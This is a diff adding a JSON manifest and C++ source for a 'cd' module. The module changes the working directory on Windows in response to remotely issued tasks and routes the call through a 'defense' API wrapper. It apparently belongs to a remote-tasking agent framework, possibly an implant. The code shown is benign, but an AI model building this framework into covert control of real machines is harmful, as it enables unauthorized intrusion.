@@ -1,0 +1,29 @@
+{
+  "module": {
+    "name": "cd",
+    "display_name": "Change Directory",
+    "description": "Change the current working directory",
+    "category": "filesystem",
+    "removable": true
+  },
+  "sources": {
+    "files": [
+      "cd.cpp",
+      "cd.h"
+    ]
+  },
+  "commands": {
+    "cd": {
+      "handler": "cd",
+      "args": [
+        "directory"
+      ],
+      "snippet": "    else if (task_name == \"cd\") {\n        nlohmann::json result;\n        std::string directory_to_traverse_to = task_data[\"task\"][\"args\"][\"directory\"];\n\n        ModuleResult module_result = cd(directory_to_traverse_to);\n\n        result[\"windows_error_code\"] = module_result.windows_error_code;\n        result[\"message\"] = GetErrorMessage(module_result.windows_error_code);\n        result[\"data\"] = module_result.data;\n        return result;\n    }"
+    }
+  },
+  "dependencies": {},
+  "files": {
+    "cd.cpp": "#include <windows.h>\n#include \"data/structs.h\"\n#include \"cd.h\"\n#include \"defense/winapi.h\"\n#include \"_debug/debug.h\"\n\nModuleResult cd(std::string pathname) {\n\tstd::wstring w_pathname(pathname.begin(), pathname.end());\n\n\tBOOL result = WinApi::SetCurrentDirectoryW(\n\t\tw_pathname.c_str()\n\t);\n\n\tif (result == 0) {\n\t\treturn { \"\", GetLastError()};\n\t}\n\treturn { \"\", ERROR_SUCCESS };\n}",
+    "cd.h": "#pragma once\n#include \"data/structs.h\"\n#include \"_debug/debug.h\"\n\nModuleResult cd(std::string pathname);"
+  }
+}
